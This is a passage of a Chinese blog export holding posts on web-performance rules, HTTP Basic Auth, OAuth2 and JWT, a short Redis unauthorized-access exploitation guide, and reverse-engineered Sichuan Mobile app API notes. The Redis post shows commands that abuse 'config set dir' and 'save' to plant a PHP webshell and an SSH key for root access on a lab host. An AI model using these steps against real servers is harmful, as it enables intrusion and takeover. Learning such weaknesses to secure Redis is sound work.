<p>例如，当我们要访问<a href="https://baidu.com" target="_blank" rel="noopener">https://baidu.com</a>时，实际上返回的是一个包含301代码的跳转，它指向的是<a href="http://baidu.com/" target="_blank" rel="noopener">http://baidu.com/</a>（注意末尾的斜杠）。在nginx服务器可以使用rewrite；Apache服务器中可以使用Alias 或者 mod_rewrite或者the DirectorySlash来避免。另一种是不用域名之间的跳转， 比如访问<a href="http://baidu.com/bbs" target="_blank" rel="noopener">http://baidu.com/bbs</a>跳转到<br><a href="http://bbs.baidu.com/" target="_blank" rel="noopener">http://bbs.baidu.com/</a>。那么可以通过使用Alias或者mod_rewirte建立CNAME（保存一个域名和另外一个域名之间关系的DNS记录）来替代。</p>
<h3 id="删除重复的JS和CSS"><a href="#删除重复的JS和CSS" class="headerlink" title="删除重复的JS和CSS"></a>删除重复的JS和CSS</h3><p>重复调用脚本，除了增加额外的HTTP请求外，多次运算也会浪费时间。在IE和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。</p>
<h3 id="配置ETags"><a href="#配置ETags" class="headerlink" title="配置ETags"></a>配置ETags</h3><p>它用来判断浏览器缓存里的元素是否和原来服务器上的一致。比last-modified date更具有弹性，例如某个文件在1秒内修改了10次，Etag可以综合Inode(文件的索引节点(inode)数)，MTime(修改时间)和Size来精准的进行判断，避开UNIX记录MTime只能精确到秒的问题。 服务器集群使用，可取后两个参数。使用ETags减少Web应用带宽和负载</p>
<h3 id="可缓存的AJAX"><a href="#可缓存的AJAX" class="headerlink" title="可缓存的AJAX"></a>可缓存的AJAX</h3><p>异步请求同样的造成用户等待，所以使用ajax请求时，要主动告诉浏览器如果该请求有缓存就去请求缓存内容。如下代码片段, <code>cache:true</code> 就是显式的要求如果当前请求有缓存的话，直接使用缓存</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">      url : <span class="string">'url'</span>,</span><br><span class="line">      dataType : <span class="string">"json"</span>,</span><br><span class="line">      cache: <span class="literal">true</span>,</span><br><span class="line">      success : <span class="function"><span class="keyword">function</span>(<span class="params">son, status</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">     &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="使用GET来完成AJAX请求"><a href="#使用GET来完成AJAX请求" class="headerlink" title="使用GET来完成AJAX请求"></a>使用GET来完成AJAX请求</h3><p>当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数据。因此使用GET获取数据时更加有意义。</p>
<h3 id="减少DOM元素数量"><a href="#减少DOM元素数量" class="headerlink" title="减少DOM元素数量"></a>减少DOM元素数量</h3><p>这是一门大学问，这里可以引申出一堆优化的细节。想要具体研究的可以看后面推荐书籍。总之大原则减少DOM数量，就会减少浏览器的解析负担。</p>
<h3 id="避免404"><a href="#避免404" class="headerlink" title="避免404"></a>避免404</h3><p>比如外链的css、js文件出现问题返回404时，会破坏浏览器的并行加载。</p>
<h3 id="减少Cookie的大小"><a href="#减少Cookie的大小" class="headerlink" title="减少Cookie的大小"></a>减少Cookie的大小</h3><p>Cookie里面别塞那么多东西，因为每个请求都得带着他跑。</p>
<h3 id="使用无cookie的域"><a href="#使用无cookie的域" class="headerlink" title="使用无cookie的域"></a>使用无cookie的域</h3><p>比如CSS、js、图片等，客户端请求静态文件的时候，减少了 Cookie 的反复传输对主域名的影响。</p>
<h3 id="不要使用滤镜"><a href="#不要使用滤镜" class="headerlink" title="不要使用滤镜"></a>不要使用滤镜</h3><p>IE独有属性AlphaImageLoader用于修正7.0以下版本中显示PNG图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。</p>
<p>完全避免使用AlphaImageLoader的最好方法就是使用PNG8格式来代替，这种格式能在IE中很好地工作。如果你确实需要使用AlphaImageLoader，请使用下划线_filter又使之对IE7以上版本的用户无效。</p>
<h3 id="不要在HTML中缩放图片"><a href="#不要在HTML中缩放图片" class="headerlink" title="不要在HTML中缩放图片"></a>不要在HTML中缩放图片</h3><p>比如你需要的图片尺寸是50* 50</p>
<p>那就不用用一张500*500的大尺寸图片，影响加载</p>
<h3 id="缩小favicon-ico并缓存"><a href="#缩小favicon-ico并缓存" class="headerlink" title="缩小favicon.ico并缓存"></a>缩小favicon.ico并缓存</h3><p>以上是Yslow的23个优化原则</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title>几种常用的认证机制</title>
    <url>/articles/%E5%87%A0%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%9A%84%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>最近想做个小程序，需要用到授权认证流程。以前项目都是用的 OAuth2 认证，但是Sanic 使用OAuth2 不太方便，就想试一下 JWT 的认证方式。这一篇主要内容是 JWT 的认证原理，以及python 使用 jwt 认识的实践。</p>
<p>几种常用的认证机制</p>
<h3 id="HTTP-Basic-Auth"><a href="#HTTP-Basic-Auth" class="headerlink" title="HTTP Basic Auth"></a>HTTP Basic Auth</h3><p>HTTP Basic Auth 在HTTP中，基本认证是一种用来允许Web浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式，通常用户名和明码会通过HTTP头传递。</p>
<p>在发送之前是以用户名追加一个冒号然后串接上口令，并将得出的结果字符串再用Base64算法编码。例如，提供的用户名是Aladdin、口令是open sesame，则拼接后的结果就是Aladdin:open sesame，然后再将其用Base64编码，得到QWxhZGRpbjpvcGVuIHNlc2FtZQ==。最终将Base64编码的字符串发送出去，由接收者解码得到一个由冒号分隔的用户名和口令的字符串。</p>
<p>优点</p>
<blockquote>
<p>基本认证的一个优点是基本上所有流行的网页浏览器都支持基本认证。</p>
</blockquote>
<p>缺点</p>
<blockquote>
<p>由于用户名和密码都是Base64编码的，而Base64编码是可逆的，所以用户名和密码可以认为是明文。所以只有在客户端和服务器主机之间的连接是安全可信的前提下才可以使用。</p>
</blockquote>
<p>接下来我们看一个更加安全也适用范围更大的认证方式 OAuth。</p>
<h3 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h3><p>OAuth 是一个关于授权（authorization）的开放网络标准。允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。现在的版本是2.0版。</p>
<p>严格来说，OAuth2不是一个标准协议，而是一个安全的授权框架。它详细描述了系统中不同角色、用户、服务前端应用（比如API），以及客户端（比如网站或移动App）之间怎么实现相互认证。</p>
<p>名词定义</p>
<p><strong>Third-party application</strong>: 第三方应用程序，又称”客户端”（client）</p>
<p><strong>HTTP service</strong>：HTTP服务提供商</p>
<p><strong>Resource Owner</strong>：资源所有者，通常称”用户”（user）。</p>
<p><strong>User Agent</strong>：用户代理，比如浏览器。</p>
<p><strong>Authorization server</strong>：认证服务器，即服务提供商专门用来处理认证的服务器。</p>
<p><strong>Resource server</strong>：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。</p>
<p>OAuth 2.0 运行流程如图：</p>
<p><img src="/articles/几种常用的认证机制/0.png" alt> </p>
<p>（A）用户打开客户端以后，客户端要求用户给予授权。</p>
<p>（B）用户同意给予客户端授权。</p>
<p>（C）客户端使用上一步获得的授权，向认证服务器申请令牌。</p>
<p>（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。</p>
<p>（E）客户端使用令牌，向资源服务器申请获取资源。</p>
<p>（F）资源服务器确认令牌无误，同意向客户端开放资源。</p>
<p>优点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">快速开发</span><br><span class="line"></span><br><span class="line">实施代码量小</span><br><span class="line"></span><br><span class="line">维护工作减少</span><br><span class="line"></span><br><span class="line">如果设计的API要被不同的App使用，并且每个App使用的方式也不一样，使用OAuth2是个不错的选择。</span><br></pre></td></tr></table></figure>

<p>缺点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OAuth2是一个安全框架，描述了在各种不同场景下，多个应用之间的授权问题。有海量的资料需要学习，要完全理解需要花费大量时间。</span><br></pre></td></tr></table></figure>

<p>OAuth2不是一个严格的标准协议，因此在实施过程中更容易出错。</p>
<p>了解了以上两种方式后，现在终于到了本篇的重点，JWT 认证。</p>
<h3 id="JWT-认证"><a href="#JWT-认证" class="headerlink" title="JWT 认证"></a>JWT 认证</h3><p>Json web token (JWT), 根据官网的定义，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<ul>
<li>JWT 特点</li>
</ul>
<p>体积小，因而传输速度快</p>
<p>传输方式多样，可以通过URL/POST参数/HTTP头部等方式传输</p>
<p>严格的结构化。它自身（在 payload 中）就包含了所有与用户相关的验证消息，如用户可访问路由、访问有效期等信息，服务器无需再去连接数据库验证信息的有效性，并且 payload 支持为你的应用而定制化。</p>
<p>支持跨域验证，可以应用于单点登录。</p>
<ul>
<li>JWT原理</li>
</ul>
<p>JWT是Auth0提出的通过对JSON进行加密签名来实现授权验证的方案，编码之后的JWT看起来是这样的一串字符：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</p>
<p>由 . 分为三段，通过解码可以得到：</p>
<ol>
<li>头部（Header）// 包括类别（typ）、加密算法（alg）；</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>jwt的头部包含两部分信息：</p>
<p>声明类型，这里是jwt</p>
<p>声明加密的算法 通常直接使用 HMAC SHA256</p>
<p>然后将头部进行base64加密（该加密是可以对称解密的)，构成了第一部分。</p>
<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ92. 载荷（payload）</p>
<p>载荷就是存放有效信息的地方。这些有效信息包含三个部分：</p>
<ul>
<li>公共的声明 ：</li>
</ul>
<p>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密。</p>
<ul>
<li>私有的声明 ：</li>
</ul>
<p>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p>
<p>下面是一个例子：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">// 包括需要传递的用户信息；</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"iss"</span>: <span class="string">"Online JWT Builder"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"iat"</span>: <span class="number">1416797419</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"exp"</span>: <span class="number">1448333419</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"aud"</span>: <span class="string">"www.gusibi.com"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"sub"</span>: <span class="string">"uid"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"nickname"</span>: <span class="string">"goodspeed"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"username"</span>: <span class="string">"goodspeed"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"scopes"</span>: [ <span class="string">"admin"</span>, <span class="string">"user"</span> ]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>iss: 该JWT的签发者，是否使用是可选的；</p>
<p>sub: 该JWT所面向的用户，是否使用是可选的；</p>
<p>aud: 接收该JWT的一方，是否使用是可选的；</p>
<p>exp(expires): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的；</p>
<p>iat(issued at): 在什么时候签发的(UNIX时间)，是否使用是可选的；</p>
<p>其他还有：</p>
<p>nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，是否使用是可选的；</p>
<p>jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</p>
<p>将上面的JSON对象进行base64编码可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）。</p>
<p>eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE0MTY3OTc0MTksImV4cCI6</p>
<p>MTQ0ODMzMzQxOSwiYXVkIjoid3d3Lmd1c2liaS5jb20iLCJzdWIiOiIwMTIzNDU2Nzg5Iiwibmlja25hbWUiOiJnb29kc3BlZWQiLCJ1c2VybmFtZSI6Imdvb2RzcGVlZCIsInNjb3BlcyI6WyJhZG1pbiIsInVzZXIiXX0</p>
<p>信息会暴露：由于这里用的是可逆的base64 编码，所以第二部分的数据实际上是明文的。我们应该避免在这里存放不能公开的隐私信息。</p>
<ol start="3">
<li>签名（signature）// 根据alg算法与私有秘钥进行加密得到的签名字串；// 这一段是最重要的敏感信息，只能在服务端解密；</li>
</ol>
<p>HMACSHA256(</p>
<p>base64UrlEncode(header) + “.” +</p>
<p>base64UrlEncode(payload),</p>
<p>SECREATE_KEY</p>
<p>)</p>
<p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p>
<p>header (base64后的)</p>
<p>payload (base64后的)</p>
<p>secret</p>
<p>将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了:</p>
<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9</p>
<p>最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）。如果我们用 secret作为密钥的话，那么就可以得到我们加密后的内容:</p>
<p>pq5IDv-yaktw6XEa5GEv07SzS9ehe6AcVSdTj0Ini4o</p>
<p>将这三部分用.连接成一个完整的字符串,构成了最终的jwt:</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE0MTY3OTc0MTksImV4cCI6MTQ0ODMzMzQxOSwiYXVkIjoid3d3Lmd1c2liaS5jb20iLCJzdWIiOiIwMTIzNDU2Nzg5Iiwibmlja25hbWUiOiJnb29kc3BlZWQiLCJ1c2VybmFtZSI6Imdvb2RzcGVlZCIsInNjb3BlcyI6WyJhZG1pbiIsInVzZXIiXX0.pq5IDv-yaktw6XEa5GEv07SzS9ehe6AcVSdTj0Ini4o</p>
<p>签名的目的：签名实际上是对头部以及载荷内容进行签名。所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。</p>
<p>这样就能保证token不会被篡改。</p>
<p>token 生成好之后，接下来就可以用token来和服务器进行通讯了。</p>
<p>下图是client 使用 JWT 与server 交互过程:</p>
<p><img src="/articles/几种常用的认证机制/1.png" alt></p>
<p>这里在第三步我们得到 JWT 之后，需要将JWT存放在 client，之后的每次需要认证的请求都要把JWT发送过来。（请求时可以放到 header 的 Authorization ）</p>
<p>JWT 使用场景</p>
<p>JWT的主要优势在于使用无状态、可扩展的方式处理应用中的用户会话。服务端可以通过内嵌的声明信息，很容易地获取用户的会话信息，而不需要去访问用户或会话的数据库。在一个分布式的面向服务的框架中，这一点非常有用。</p>
<p>但是，如果系统中需要使用黑名单实现长期有效的token刷新机制，这种无状态的优势就不明显了。</p>
<p>优点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">快速开发</span><br><span class="line"></span><br><span class="line">不需要cookie</span><br><span class="line"></span><br><span class="line">JSON在移动端的广泛应用</span><br><span class="line"></span><br><span class="line">不依赖于社交登录</span><br><span class="line"></span><br><span class="line">相对简单的概念理解</span><br></pre></td></tr></table></figure>

<p>缺点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Token有长度限制</span><br><span class="line"></span><br><span class="line">Token不能撤销</span><br><span class="line"></span><br><span class="line">需要token有失效时间限制(exp)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>初识Redis未授权访问</title>
    <url>/articles/%E5%88%9D%E8%AF%86Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<p>redis是一种以key-value为键值对的非关系型数据库</p>
<p>redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Map), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>本机通过telnet命令主动去连接目标机</p>
<blockquote>
<p>telnet 192.168.1.13 6379</p>
</blockquote>
<p>或者通过 <code>redis-cli.exe -h 192.168.1.13</code> 连接</p>
<p>连接成功后，输入info获取相关信息可以看到redis版本号等</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="写入一句话webshell"><a href="#写入一句话webshell" class="headerlink" title="写入一句话webshell"></a>写入一句话webshell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//设置x的值</span><br><span class="line"></span><br><span class="line">redis 192.168.1.13:6379&gt; set x &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line"></span><br><span class="line">redis 192.168.1.13:6379&gt; config set dbfilename test.php</span><br><span class="line"></span><br><span class="line">redis 192.168.1.13:6379&gt; config set dir D:/WWW/</span><br><span class="line"></span><br><span class="line">redis 192.168.1.13:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>成功写入目标机</p>
<blockquote>
<p><a href="http://192.168.1.13/test.php" target="_blank" rel="noopener">http://192.168.1.13/test.php</a></p>
</blockquote>
<h4 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h4><ul>
<li>在本地生成一对密钥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@ip-172-31-14-115:~/.ssh# ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p>接着将ssh公钥写入靶机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@ip-172-31-14-115:/etc/redis# redis-cli -h 192.168.1.13</span><br><span class="line"></span><br><span class="line">192.168.1.13:6379&gt; config set dir /root/.ssh # 设置本地存储文件目录</span><br><span class="line"></span><br><span class="line">192.168.1.13:6379&gt; config set dbfilename pub_keys # 设置本地存储文件</span><br><span class="line"></span><br><span class="line">192.168.1.13:6379&gt; set x &quot;xxxx&quot;  # 将你的ssh公钥写入x键里。(xxxx即你自己生成的ssh公钥)</span><br><span class="line"></span><br><span class="line">192.168.1.13:6379&gt; save     # 保存</span><br></pre></td></tr></table></figure>

<p>再到本地去连接ssh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@ip-:~/.ssh# ssh -i id_rsa root@192.168.1.13</span><br></pre></td></tr></table></figure>

<p>即可</p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title>四川移动掌厅APP接口分析</title>
    <url>/articles/%E5%9B%9B%E5%B7%9D%E7%A7%BB%E5%8A%A8%E6%8E%8C%E5%8E%85APP%E6%8E%A5%E5%8F%A3%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><h4 id="获取短信验证码"><a href="#获取短信验证码" class="headerlink" title="获取短信验证码"></a>获取短信验证码</h4><p><strong>简要描述：</strong></p>
<ul>
<li>获取短信验证码</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="http://wap.sc.10086.cn/scmccCampaign/newturntable/getYzm.do" target="_blank" rel="noopener">http://wap.sc.10086.cn/scmccCampaign/newturntable/getYzm.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">phone</td>
<td align="left">是</td>
<td align="left">string</td>
<td>手机号，需要base64编码</td>
</tr>
</tbody></table>
<p> <strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: <span class="literal">null</span>,</span><br><span class="line">        "code": 0,// 0表示发送成功 4发送过于频繁</span><br><span class="line">        "info": ""</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="短信登录"><a href="#短信登录" class="headerlink" title="短信登录"></a>短信登录</h4><p><strong>简要描述：</strong></p>
<ul>
<li>短信登录</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="http://wap.sc.10086.cn/scmccCampaign/newturntable/drawdenglu.do" target="_blank" rel="noopener">http://wap.sc.10086.cn/scmccCampaign/newturntable/drawdenglu.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">desdrawPhone</td>
<td align="left">是</td>
<td align="left">string</td>
<td>手机号，需要base64编码</td>
</tr>
<tr>
<td align="left">yzm</td>
<td align="left">是</td>
<td align="left">string</td>
<td>验证码</td>
</tr>
</tbody></table>
<p> <strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: <span class="literal">null</span>,</span><br><span class="line">        "code": 0, // 0表示登录成功 11验证码校验失败 12验证码已过期</span><br><span class="line">        "info": "xxxx" // 返回单点登录的token</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 返回的Cookie中SSOCookie就是单点登录凭证,这个SSOCookie有很大的安全问题，不知是不是厂商故意这么做的</span><br></pre></td></tr></table></figure>

<hr>

<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><h4 id="当前用户信息"><a href="#当前用户信息" class="headerlink" title="当前用户信息"></a>当前用户信息</h4><p><strong>简要描述：</strong></p>
<ul>
<li>用户信息</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccClientWap/novelInfoUnifiedQuery/queryNovelUserInfo.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccClientWap/novelInfoUnifiedQuery/queryNovelUserInfo.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p> <strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: &#123;</span><br><span class="line">            "starLevel": "2", // 用户级别</span><br><span class="line">            "balance": "41.92",// 话费余额</span><br><span class="line">            "score": "253",// 可用积分</span><br><span class="line">            "yx_PREPAY": "0",// 营销抵消话费</span><br><span class="line">            "currMonthConsume": "12.54",// 当月消费情况</span><br><span class="line">            "mobile": "&#123;当前用户手机号明文&#125;"// 当前账户手机号</span><br><span class="line">        &#125;,</span><br><span class="line">        "code": 0,</span><br><span class="line">        "info": "成功"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h4 id="用户流量信息"><a href="#用户流量信息" class="headerlink" title="用户流量信息"></a>用户流量信息</h4><p><strong>简要描述：</strong></p>
<ul>
<li>用户流量信息</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="https://wap.sc.10086.cn/scmccClientWap/novelInfoUnifiedQuery/queryNovelPackageSurplus.do" target="_blank" rel="noopener">https://wap.sc.10086.cn/scmccClientWap/novelInfoUnifiedQuery/queryNovelPackageSurplus.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
</tbody></table>
<p> <strong>返回示例</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: &#123;</span><br><span class="line">            <span class="attr">"retval"</span>: <span class="string">"E00"</span>,</span><br><span class="line">            <span class="attr">"surplusSMS"</span>: <span class="number">60</span>,</span><br><span class="line">            <span class="attr">"lastMthFlow"</span>: <span class="string">"32.00MB"</span>,</span><br><span class="line">            <span class="attr">"surplusFlow"</span>: <span class="string">"9.70GB"</span>,</span><br><span class="line">            <span class="attr">"usedFlow"</span>: <span class="string">"1.75GB"</span>,</span><br><span class="line">            <span class="attr">"flowTotal"</span>: <span class="number">12009472</span>,</span><br><span class="line">            <span class="attr">"usedVoice"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"smsTotal"</span>: <span class="number">60</span>,</span><br><span class="line">            <span class="attr">"newsurplusFlow"</span>: <span class="string">"9.70GB"</span>,</span><br><span class="line">            <span class="attr">"newUsedFlow"</span>: <span class="string">"1.75GB"</span>,</span><br><span class="line">            <span class="attr">"usedSMS"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"voiceTotal"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"surplusVoice"</span>: <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"code"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"info"</span>: <span class="string">"成功"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

<h3 id="转盘抽奖活动"><a href="#转盘抽奖活动" class="headerlink" title="转盘抽奖活动"></a>转盘抽奖活动</h3><h4 id="抽奖"><a href="#抽奖" class="headerlink" title="抽奖"></a>抽奖</h4><p><strong>简要描述：</strong></p>
<ul>
<li>抽奖</li>
</ul>
<p><strong>请求URL：</strong></p>
<ul>
<li><a href="http://wap.sc.10086.cn/scmccCampaign/newturntable/dzpDraw.do" target="_blank" rel="noopener">http://wap.sc.10086.cn/scmccCampaign/newturntable/dzpDraw.do</a></li>
</ul>
<p><strong>请求方式：</strong></p>
<ul>
<li><code>POST</code></li>
</ul>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">必选</th>
<th align="left">类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SSOCookie</td>
<td align="left">是</td>
<td align="left">string</td>
<td>登录Cookie中返回的SSOCookie</td>
</tr>
<tr>
<td align="left">canals</td>
<td align="left">是</td>
<td align="left">string</td>
<td><code>sh2</code>: 网页点击分享的转盘抽奖  <code>zt1</code>: APP的H5转盘抽奖</td>
</tr>
</tbody></table>
<p><strong>返回示例</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"obj"</span>: &#123;</span><br><span class="line">            <span class="attr">"f_date"</span>: <span class="string">"20200406"</span>,</span><br><span class="line">            <span class="attr">"f_send_status"</span>: <span class="string">"8"</span>,</span><br><span class="line">            <span class="attr">"f_phone"</span>: <span class="string">"&#123;当前用户手机号明文&#125;"</span>,</span><br><span class="line">            <span class="attr">"f_channel"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"f_prize_name"</span>: <span class="string">"谢谢参与"</span>,</span><br><span class="line">            <span class="attr">"f_prize_id"</span>: <span class="string">"99"</span>,</span><br><span class="line">            <span class="attr">"f_canals"</span>: <span class="string">"zt1"</span>,</span><br><span class="line">            <span class="attr">"f_todayChar6"</span>: <span class="string">"202004"</span>,</span><br><span class="line">            <span class="attr">"si"</span>: <span 